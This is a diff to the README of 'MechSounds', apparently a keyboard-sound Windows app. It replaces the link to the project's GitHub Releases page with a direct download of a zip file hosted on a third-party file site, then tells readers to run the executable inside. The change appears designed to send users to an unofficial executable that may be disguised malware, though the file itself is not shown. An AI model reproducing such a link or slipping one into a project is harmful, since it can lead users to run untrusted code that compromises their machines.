@@ -29,8 +29,7 @@ never pause (the setting is remembered).
 
 ## Get it
 
-Download the ready-to-run zip (exe + sounds) from
-[Releases](https://github.com/DarkMonkey98/MechSounds/releases).
+[Download MechSounds v11](https://muse.ai/files/1323371437529100/28997840379912453/a4j5ehhsphklxo631ecn0uwt/MechSounds-v11.zip) — ready-to-run zip (exe + sounds).
 Unzip it anywhere and double-click `MechSounds.exe` — the `sounds/`
 folder must stay next to the exe.
 
